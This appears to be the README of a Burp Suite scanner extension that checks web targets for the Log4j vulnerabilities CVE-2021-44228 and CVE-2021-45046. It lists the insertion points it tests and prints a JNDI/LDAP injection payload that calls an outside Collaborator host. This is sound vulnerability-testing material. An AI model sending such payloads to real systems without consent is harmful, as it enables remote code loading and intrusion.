# Log4j-HammerTime
This Burp Suite Active Scanner extension validates exploitation of the Apache Log4j CVE-2021-44228 and CVE-2021-45046 vulnerabilities. 

This extension uses the Burp Collaborator to verify the issue.

## Usage

* Enable this extension
* Launch an Active Scan on a specific target

if you want to run only checks from this module, you can import the [extensions-only.json](./extensions-only.json) profile and select it as the Active Scan Profile.

## Details
During an Active Scan, the following insertion points are tried in this extension:
* HEADER
* PARAM_NAME_BODY
* PARAM_BODY
* PARAM_NAME_URL
* PARAM_URL
* PARAM_COOKIE
* PARAM_JSON
* ENTIRE_BODY 

At each insertion point, the request is injected with the following payload:
```${jndi:ldap://{BURPCOLLABORATOR}/exploit.class}```

Moreover, this extension adds many headers which are enabled in [headers](./resources/headers) (uncommented lines). 
These headers are injected one-by-one in a seperate request.

## Legal Disclaimer
This project is made for educational and ethical testing purposes only. Usage of Log4Shell-active-scanner for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

## License
The project is licensed under MIT License.

## Authors
* Freskimo
